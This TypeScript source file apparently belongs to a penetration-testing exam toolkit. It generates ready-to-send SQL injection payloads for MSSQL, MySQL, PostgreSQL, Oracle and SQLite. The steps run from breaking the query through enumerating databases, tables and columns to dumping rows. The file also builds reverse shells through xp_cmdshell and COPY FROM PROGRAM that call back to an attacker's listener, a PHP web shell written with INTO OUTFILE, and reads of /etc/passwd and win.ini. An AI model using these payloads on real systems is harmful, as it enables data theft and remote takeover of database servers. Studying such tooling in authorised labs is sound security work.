import { sqlQuote, urlEncodeShell } from "./encode";
import { buildPayload } from "./build";
import { REVERSE_SHELLS } from "./reverseShells";
import { keywordParts } from "./sqlKeywords";
import type { BuiltPayload, PayloadDef, PayloadPart } from "./types";

export const SQL_ENGINES = ["mssql", "mysql", "postgres", "oracle", "sqlite"] as const;
export type SqlEngine = (typeof SQL_ENGINES)[number];
/** client-session: impacket-mssqlclient / mysql / psql. No injection break, comment or encoding. */
export type SqlPoint = "url-param" | "form-field" | "client-session";

export interface SqlValues {
  /** The injection break. Default `'` for url-param/form-field; ignored for client-session. "" = numeric context. */
  prefix?: string;
  /** Column count of the app's query (column-count: the n to try, default 1). */
  columns?: number;
  /** Which column (1-based) is shown on the page; default 1. */
  reflected?: number;
  table?: string;
  /** One column, or "a,b" to join several with ':'. */
  column?: string;
  /** Custom OS command for the exec ids (overrides `shell`). */
  cmd?: string;
  path?: string;
  LHOST?: string;
  LPORT?: string;
  /** mssql-xp_cmdshell: which reverse shell to embed: ps-b64 (default), nishang-cradle, nc-exe. */
  shell?: string;
}

export const SQL_STEPS = [
  { id: "detect-error", title: "Break the query", explain: "Send a lone quote. A database error, a 500 or a changed page means your input reaches SQL unescaped. '' (two quotes) should then be fine again: that is string context." },
  { id: "detect-boolean", title: "Boolean test", explain: "Send AND 1=1 (page unchanged) then AND 1=2 (page changes or empties). Different answers to true and false confirm your text is being run as SQL, with no errors needed." },
  { id: "detect-time", title: "Time test", explain: "Make the database sleep. A slow response confirms injection even when the page never changes, and the sleep function that works tells you the DBMS." },
  { id: "column-count", title: "Count the columns", explain: "UNION needs the same number of columns as the app's query. Raise the number until ORDER BY errors; the count is the last number that worked." },
  { id: "reflected-columns", title: "Find the shown columns", explain: "Put a different label in each column of a UNION SELECT and see which labels appear on the page. Only those columns can carry data back to you." },
  { id: "version", title: "Version", explain: "Read the DB version through the shown column. It confirms the DBMS and so which syntax to use next." },
  { id: "databases", title: "Databases", explain: "List the databases (schemas) on the server to find the application's own." },
  { id: "tables", title: "Tables", explain: "List the tables of the application database. Look for users, accounts, admin." },
  { id: "columns", title: "Columns", explain: "List the columns of the interesting table so you can name them in the final SELECT." },
  { id: "rows", title: "Rows", explain: "Pull the data: the chosen columns joined with ':' so one shown column carries several values." },
] as const;

/** `explain`: the injection's needs. `session`: the same without the injection-only ones (stacked queries, the shown column). */
export const SQL_EXEC = [
  { id: "mssql-enable-xp_cmdshell", engine: "mssql", title: "Enable xp_cmdshell", explain: "xp_cmdshell is switched off by default. A sysadmin can switch it on. Needs stacked queries.", session: "xp_cmdshell is switched off by default. A sysadmin can switch it on." },
  { id: "mssql-xp_cmdshell", engine: "mssql", title: "xp_cmdshell reverse shell", explain: "Runs a Windows command as the SQL Server service account. Needs sysadmin, stacked queries and the setting enabled.", session: "Runs a Windows command as the SQL Server service account. Needs sysadmin and the setting enabled." },
  { id: "postgres-copy-program", engine: "postgres", title: "COPY FROM PROGRAM reverse shell", explain: "Runs an OS command as the postgres user. Needs superuser (or pg_execute_server_program), PostgreSQL 9.3+ and stacked queries.", session: "Runs an OS command as the postgres user. Needs superuser (or pg_execute_server_program) and PostgreSQL 9.3+." },
  { id: "mysql-into-outfile-webshell", engine: "mysql", title: "INTO OUTFILE web shell", explain: "Writes a PHP file into the web root, then you call it. Needs FILE privilege, empty secure_file_priv, a writable known web root and a working UNION. A web shell alone scores nothing on the exam: use it to launch a real shell.", session: "Writes a PHP file into the web root, then you call it. Needs FILE privilege, empty secure_file_priv and a writable known web root." },
  { id: "mysql-load-file", engine: "mysql", title: "LOAD_FILE read a file", explain: "Reads a file from the DB server through the shown column. Needs the FILE privilege.", session: "Reads a file from the DB server. Needs the FILE privilege." },
  { id: "mssql-read-file", engine: "mssql", title: "OPENROWSET read a file", explain: "Reads a file from the DB server through the shown column. Needs bulk-admin rights.", session: "Reads a file from the DB server. Needs bulk-admin rights." },
] as const;

type Step = (typeof SQL_STEPS)[number]["id"];
type Exec = (typeof SQL_EXEC)[number]["id"];

export function sqlExecIds(engine: SqlEngine): string[] {
  return SQL_EXEC.filter((x) => x.engine === engine).map((x) => x.id);
}

const COMMENT: Record<SqlEngine, string> = { mssql: "-- -", mysql: "-- -", postgres: "-- -", oracle: "-- -", sqlite: "-- -" };
const IDENT = /^[A-Za-z_][\w$.]*$/;

interface Ctx {
  engine: SqlEngine; point: SqlPoint; v: SqlValues; unresolved: string[]; notes: string[]; extra: PayloadPart[]; listener: string | null;
  /** The embedded shell's Kali-side prepare step (a served cradle). */
  prepare: string | null;
}
/** `inject`: text after the prefix. `stacked`: a whole new statement after `;`. `plain`: standalone statement for a session (null = not applicable there). */
interface Core { inject: string; plain: string | null; stacked?: boolean; bare?: boolean }

const need = (c: Ctx, name: string, v: string | undefined): string => {
  const t = (v ?? "").trim();
  if (t === "") { if (!c.unresolved.includes(name)) c.unresolved.push(name); return `{${name}}`; }
  return t;
};
const ident = (c: Ctx, name: string, v: string | undefined): string => {
  const t = need(c, name, v);
  if (t.startsWith("{")) return t;
  for (const p of t.split(",")) if (!IDENT.test(p.trim())) throw new Error(`${name} "${p}" is not a plain SQL name`);
  return t.split(",").map((p) => p.trim()).join(",");
};
const lit = (s: string) => `'${sqlQuote(s)}'`;
const fromDual = (c: Ctx, from: string) => (from ? ` FROM ${from}` : c.engine === "oracle" ? " FROM dual" : "");

function unionRow(c: Ctx, exprs: Record<number, string>, from = ""): string {
  const cols = c.v.columns;
  if (!cols || !Number.isInteger(cols) || cols < 1) {
    need(c, "COLUMNS", undefined);
    return `UNION SELECT {COLUMNS}${fromDual(c, from)}`;
  }
  const list = Array.from({ length: cols }, (_, i) => exprs[i + 1] ?? "NULL").join(",");
  return `UNION SELECT ${list}${fromDual(c, from)}`;
}

/** The shown column (default 1), checked against the column count. `assume`: note when it was not given. */
function shown(c: Ctx, assume = true): number {
  const r = c.v.reflected ?? 1;
  if (!Number.isInteger(r) || r < 1) throw new Error(`reflected column ${r} must be a whole number from 1`);
  if (c.v.columns && r > c.v.columns) throw new Error(`reflected column ${r} is beyond ${c.v.columns} columns`);
  if (assume && c.v.reflected === undefined && c.point !== "client-session") c.notes.push("Assuming column 1 is the shown one: run reflected-columns first and pass the real position.");
  return r;
}

/** A value read through the shown column (UNION) or on its own (session). */
function data(c: Ctx, expr: string, from = "", suffix = ""): Core {
  const plain = `SELECT ${expr}${fromDual(c, from + suffix)}`;
  // A session runs the plain statement only: no UNION, so no column count or shown column to check.
  if (c.point === "client-session") return { inject: "", plain };
  const r = shown(c);
  return { inject: `AND 1=2 ${unionRow(c, { [r]: expr }, from + suffix)}`, plain };
}

/**
 * A catalogue listing (databases, tables, columns). Injected, the rows are joined into one value, because the page
 * shows one row; in a session the client prints every row, so it is a plain SELECT.
 */
function listing(c: Ctx, col: string, from: string, where = "", order = col): Core {
  const plain = `SELECT ${col} FROM ${from}${where}`;
  let d: Core;
  switch (c.engine) {
    case "mysql":
      d = data(c, `GROUP_CONCAT(${col} SEPARATOR ' | ')`, from, where);
      if (c.point !== "client-session") c.notes.push("GROUP_CONCAT stops at 1024 characters (group_concat_max_len). If the list ends mid-name, drop GROUP_CONCAT and page with LIMIT n,1.");
      break;
    case "sqlite": d = data(c, `GROUP_CONCAT(${col},' | ')`, from, where); break;
    case "postgres": d = data(c, `string_agg(${col}::text,' | ')`, from, where); break;
    case "oracle":
      d = data(c, `LISTAGG(${col},' | ') WITHIN GROUP (ORDER BY ${order})`, from, where);
      if (c.point !== "client-session") c.notes.push("LISTAGG needs Oracle 11gR2+ and fails (ORA-01489) past 4000 characters: then list one row at a time with OFFSET n ROWS FETCH NEXT 1 ROWS ONLY (12c+) or ROWNUM.");
      break;
    case "mssql":
      d = data(c, `(SELECT ${col}+' | ' FROM ${from}${where} FOR XML PATH(''))`);
      if (c.point !== "client-session") c.notes.push("FOR XML PATH('') works on MSSQL 2005 and later (2017+ also has STRING_AGG). It escapes & and < as &amp; and &lt;.");
      break;
  }
  return { inject: d.inject, plain };
}

const SLEEP: Record<SqlEngine, { inject: string; plain: string; stacked?: boolean }> = {
  mssql: { inject: "WAITFOR DELAY '0:0:5'", plain: "WAITFOR DELAY '0:0:5'", stacked: true },
  mysql: { inject: "AND SLEEP(5)", plain: "SELECT SLEEP(5)" },
  postgres: { inject: "AND 1=(SELECT 1 FROM pg_sleep(5))", plain: "SELECT pg_sleep(5)" },
  oracle: { inject: "AND 1=dbms_pipe.receive_message('a',5)", plain: "SELECT dbms_pipe.receive_message('a',5) FROM dual" },
  sqlite: { inject: "AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000))))", plain: "SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000))))" },
};

const VERSION: Record<SqlEngine, [string, string]> = {
  mssql: ["@@version", ""], mysql: ["@@version", ""], postgres: ["version()", ""], oracle: ["banner", "v$version"], sqlite: ["sqlite_version()", ""],
};

function joinCols(e: SqlEngine, cols: string[]): string {
  if (cols.length === 1) return e === "mysql" ? `GROUP_CONCAT(${cols[0]} SEPARATOR ' | ')` : cols[0];
  if (e === "mssql") return cols.join("+':'+");
  if (e === "mysql") return `GROUP_CONCAT(CONCAT(${cols.join(",':',")}) SEPARATOR ' | ')`;
  return cols.join("||':'||");
}

const STEP_CORE: Record<Step, (c: Ctx) => Core> = {
  "detect-error": () => ({ inject: "", plain: null, bare: true }),
  "detect-boolean": (c) => ({ inject: "AND 1=1", plain: c.engine === "oracle" ? "SELECT 1 FROM dual WHERE 1=1" : c.engine === "mysql" ? "SELECT 1 FROM DUAL WHERE 1=1" : "SELECT 1 WHERE 1=1" }),
  "detect-time": (c) => {
    const s = SLEEP[c.engine];
    if (c.engine === "oracle") c.notes.push("dbms_pipe needs EXECUTE on DBMS_PIPE, which ordinary users often lack. No delay may mean no grant, not no injection: rely on the boolean test then.");
    return { inject: s.inject, plain: s.plain, stacked: s.stacked };
  },
  "column-count": (c) => ({ inject: `ORDER BY ${c.v.columns ?? 1}`, plain: null }),
  "reflected-columns": (c) => {
    const n = c.v.columns;
    const strict = c.engine === "mssql" || c.engine === "postgres" || c.engine === "oracle";
    const r = shown(c, false);
    if (!n || !Number.isInteger(n) || n < 1) {
      // No count yet: there is nothing to label. {COLUMNS} stays to fill in, and the note says how to get it.
      c.notes.push(`Fill in the column count first (column-count step). Or send UNION SELECT NULL, then NULL,NULL and so on: the first that stops erroring has the right count.${strict ? ` Then ${c.engine} needs the label in one column at a time, NULL elsewhere.` : ""}`);
      return { inject: `AND 1=2 ${unionRow(c, {})}`, plain: null };
    }
    if (strict) {
      // Strict engines reject a string in a non-text column, so label ONE column and keep NULL elsewhere.
      c.notes.push(`${c.engine} errors if a string lands in a non-text column, so this labels only column ${r} and keeps NULL elsewhere. Send it once per column (set reflected to 1, 2, 3...): the label that shows on the page marks a shown text column; a type error means that column is not text.`);
      return { inject: `AND 1=2 ${unionRow(c, { [r]: `'c${r}'` })}`, plain: null };
    }
    const labels = Object.fromEntries(Array.from({ length: n }, (_, i) => [i + 1, `'c${i + 1}'`]));
    return { inject: `AND 1=2 ${unionRow(c, labels)}`, plain: null };
  },
  version: (c) => { const [e, f] = VERSION[c.engine]; return data(c, e, f); },
  databases: (c) => {
    switch (c.engine) {
      case "mysql": return listing(c, "schema_name", "information_schema.schemata");
      case "mssql": return listing(c, "name", "sys.databases");
      case "postgres": return listing(c, "datname", "pg_database");
      case "oracle": return listing(c, "username", "all_users");
      case "sqlite": return listing(c, "name", "pragma_database_list");
    }
  },
  tables: (c) => {
    switch (c.engine) {
      case "mysql": return listing(c, "table_name", "information_schema.tables", " WHERE table_schema=database()");
      case "mssql": return listing(c, "table_name", "information_schema.tables");
      case "postgres": return listing(c, "table_name", "information_schema.tables", " WHERE table_schema='public'");
      case "oracle":
        c.notes.push("Lists the connected user's own tables. For another schema use owner='NAME' (upper case).");
        return listing(c, "table_name", "all_tables", " WHERE owner=USER");
      case "sqlite": return listing(c, "name", "sqlite_master", " WHERE type='table'");
    }
  },
  columns: (c) => {
    const t = c.v.table?.trim() ? c.v.table.trim() : need(c, "TABLE", undefined);
    const q = t.startsWith("{") ? `'${t}'` : lit(c.engine === "oracle" ? t.toUpperCase() : t);
    switch (c.engine) {
      case "mysql": case "mssql": case "postgres": return listing(c, "column_name", "information_schema.columns", ` WHERE table_name=${q}`);
      case "oracle": c.notes.push("Oracle stores names in upper case, so the table name was upper-cased."); return listing(c, "column_name", "all_tab_columns", ` WHERE table_name=${q}`, "column_id");
      case "sqlite": return data(c, "sql", "sqlite_master", ` WHERE name=${q}`);
    }
  },
  rows: (c) => {
    const t = ident(c, "TABLE", c.v.table);
    const col = ident(c, "COLUMN", c.v.column);
    const cols = col.split(",");
    const paging: Record<SqlEngine, string> = {
      mssql: "MSSQL has no LIMIT: use SELECT TOP 1 ... WHERE x NOT IN (...) or OFFSET n ROWS FETCH NEXT 1 ROWS ONLY to step through rows.",
      mysql: "GROUP_CONCAT truncates at 1024 characters: for big tables fetch one row at a time with LIMIT n,1.",
      postgres: "To step through rows add LIMIT 1 OFFSET n.", oracle: "To step through rows add OFFSET n ROWS FETCH NEXT 1 ROWS ONLY (12c+) or filter on ROWNUM.", sqlite: "To step through rows add LIMIT 1 OFFSET n.",
    };
    c.notes.push(paging[c.engine]);
    if (c.engine === "mssql" && cols.length > 1) c.notes.push("+ joins strings on MSSQL; a non-text column needs CAST(col AS varchar(100)).");
    return data(c, joinCols(c.engine, cols), t);
  },
};

/** Reverse shell command text for the exec ids, via the Task 2 definitions. */
function embeddedShell(c: Ctx, id: string, ctx: "bash-prompt" | "cmd"): string {
  const def = REVERSE_SHELLS.find((d) => d.id === id);
  if (!def) throw new Error(`Unknown shell ${id}`);
  const b = buildPayload(def, ctx, { LHOST: c.v.LHOST ?? "", LPORT: c.v.LPORT ?? "", FILE: "" });
  for (const u of b.unresolved) if (!c.unresolved.includes(u)) c.unresolved.push(u);
  c.listener = b.listener;
  c.prepare = b.prepare;
  c.extra.push(...b.parts);
  c.notes.push(...b.notes.filter((n) => n.startsWith("LHOST and LPORT are baked")));
  return b.text;
}

const EXEC_CORE: Record<Exec, (c: Ctx) => Core> = {
  "mssql-enable-xp_cmdshell": (c) => {
    c.notes.push("From impacket-mssqlclient the built-in enable_xp_cmdshell does the same.");
    return { inject: "EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;", plain: "EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;", stacked: true };
  },
  "mssql-xp_cmdshell": (c) => {
    const shell = c.v.shell ?? "ps-b64";
    const cmd = c.v.cmd?.trim() ? c.v.cmd.trim() : embeddedShell(c, shell, "cmd");
    if (shell === "nc-exe" && !c.v.cmd) c.notes.push(`nc.exe must already be on the target (upload it first); path ${"C:\\Windows\\Temp\\nc.exe"} assumed.`);
    c.notes.push("Single quotes inside the command are doubled ('') so they survive the xp_cmdshell '...' string.");
    const s = `EXEC xp_cmdshell ${lit(cmd)};`;
    return { inject: s, plain: s, stacked: true };
  },
  "postgres-copy-program": (c) => {
    const table = ident(c, "TABLE", c.v.table?.trim() || "cmd_exec");
    const prog = c.v.cmd?.trim() ? c.v.cmd.trim() : `bash -c "${embeddedShell(c, "bash-tcp", "bash-prompt")}"`;
    c.notes.push(`Creates ${table} if missing, then COPY loads the command output into it (read it back with a SELECT).`);
    c.notes.push("Wrapped in bash -c \"...\" because the program runs under sh, and \" avoids doubling quotes in the SQL string.");
    if (c.point === "url-param") c.notes.push("> and & become %3E and %26 so the URL parser does not split the request; the -c flag stays raw.");
    const s = `CREATE TABLE IF NOT EXISTS ${table}(cmd_output text); COPY ${table} FROM PROGRAM ${lit(prog)};`;
    return { inject: s, plain: s, stacked: true };
  },
  "mysql-into-outfile-webshell": (c) => {
    const path = need(c, "PATH", c.v.path);
    c.notes.push("INTO OUTFILE never overwrites: pick a new filename each time. Then call ?cmd=id on the file; it only proves execution, so launch a real shell from it.");
    const shell = `'<?php system($_GET["cmd"]); ?>'`;
    const r = shown(c);
    return { inject: `AND 1=2 ${unionRow(c, { [r]: shell })} INTO OUTFILE ${path.startsWith("{") ? `'${path}'` : lit(path)}`, plain: null };
  },
  "mysql-load-file": (c) => {
    const path = c.v.path?.trim();
    if (!path) c.notes.push("Defaults to /etc/passwd as a harmless test; use LOAD_FILE on the web server config to find the web root.");
    return data(c, `LOAD_FILE(${lit(path || "/etc/passwd")})`);
  },
  "mssql-read-file": (c) => {
    const path = c.v.path?.trim();
    if (!path) c.notes.push("Defaults to C:\\Windows\\win.ini as a harmless test.");
    const p = path || "C:\\Windows\\win.ini";
    c.notes.push("Needs ADMINISTER BULK OPERATIONS (sysadmin has it).");
    return data(c, "BulkColumn", `OPENROWSET(BULK ${lit(p)},SINGLE_CLOB) AS t`);
  },
};

/** URL-encodes for url-param; the unresolved placeholders stay readable, any other {…} (a custom cmd's ${IFS}) is encoded. */
function finalize(raw: string, point: SqlPoint, unresolved: string[]): string {
  return point === "url-param" ? urlEncodeShell(raw, unresolved) : raw;
}

/** A custom command that runs netcat (nc, nc64, nc.exe, a full path to one). */
const NC_CMD = /(?:^|[\\/\s"])nc(?:64)?(?:\.exe)?\s/i;

export function buildSql(stepOrExecId: string, engine: SqlEngine, point: SqlPoint, values: SqlValues = {}): BuiltPayload {
  const exec = SQL_EXEC.find((x) => x.id === stepOrExecId);
  const step = SQL_STEPS.find((s) => s.id === stepOrExecId);
  if (!exec && !step) throw new Error(`Unknown SQL step or exec id: ${stepOrExecId}`);
  if (exec && exec.engine !== engine) throw new Error(`${exec.id} applies to ${exec.engine}, not ${engine}`);

  const c: Ctx = { engine, point, v: values, unresolved: [], notes: [], extra: [], listener: null, prepare: null };
  const core = exec ? EXEC_CORE[exec.id](c) : STEP_CORE[step!.id as Step](c);

  const session = point === "client-session";
  let prefix = values.prefix ?? "'";
  if (core.bare && prefix === "" && !session) {
    prefix = "'";
    c.notes.push("Numeric context has no quote to break, but a lone ' still breaks the query. If it does not error, try 1/0 or 1 AND 1=1 instead.");
  }
  let raw: string;
  /** The statement after the injection break: what the keyword scan reads (the prefix is the app's value). */
  let stmt: string;
  if (session) {
    if (core.plain === null) throw new Error(`${stepOrExecId} is an injection step: it does not apply in a client session`);
    raw = stmt = core.plain;
  } else {
    const comment = core.bare ? "" : COMMENT[engine];
    const clause = core.stacked ? `; ${core.inject}` : core.inject ? ` ${core.inject}` : "";
    raw = `${prefix}${clause}${comment}`;
    if (!core.stacked && prefix === "") raw = raw.trimStart();
    stmt = `${clause}${comment}`;
  }

  const parts: PayloadPart[] = [];
  if (!session && prefix !== "") parts.push({ token: prefix, explain: prefix.includes("'") ? "The quote closes the string the app opened, so what follows is read as SQL, not data." : "The break that ends the app's value and starts your SQL." });
  if (!session && prefix === "") parts.push({ token: "(no prefix)", explain: "Numeric context: the value is not quoted, so no break is needed." });
  if (core.stacked && !session) parts.push({ token: ";", explain: "; ends the app's statement and starts a new one (a stacked query). Works on MSSQL and PostgreSQL, usually not on MySQL from PHP." });
  parts.push(...keywordParts(stmt, session));
  parts.push(...c.extra);

  const notes = [...c.notes];
  if (engine === "mysql" && !session && !core.bare) notes.push("MySQL also accepts # as the comment; send it as %23 in a URL.");
  if (point === "url-param") notes.push("URL-encoded: spaces as +, quotes, ; & > | = / as %XX, so it works pasted into the URL or Burp. The browser does not encode it again.");
  if (point === "form-field") notes.push("Raw text: type it in the field as shown; the browser does the URL-encoding when it submits.");
  if (session) notes.push("Plain statement for impacket-mssqlclient, mysql or psql: no quote break, no trailing comment, no encoding.");
  if (exec) notes.push(`Needs: ${session ? exec.session : exec.explain}`);

  let text = finalize(raw, point, c.unresolved);
  // R3: the nc.exe -e flag needed %2d through xp_cmdshell in a URL, embedded or typed as a custom cmd; nothing else gets it.
  const customNc = values.cmd?.trim() ? NC_CMD.test(values.cmd) : false;
  if (point === "url-param" && exec?.id === "mssql-xp_cmdshell" && (customNc || (!values.cmd?.trim() && values.shell === "nc-exe"))) text = text.replace(/\+-e\+/g, "+%2de+");

  const def: PayloadDef = {
    id: stepOrExecId, generator: "sql", title: (exec ?? step)!.title, os: engine === "mssql" ? "windows" : "linux",
    contexts: [point === "url-param" ? "url-param" : "sql-string"], requires: [], template: raw, parts,
    listeners: c.listener ? ["penelope", "rlwrap-nc"] : [],
  };
  return {
    def, text, listener: c.listener, listenerId: c.listener ? "penelope" : null, listenerHeading: "Listener", trigger: null,
    parts, notes, unresolved: c.unresolved, prepare: c.prepare,
  };
}
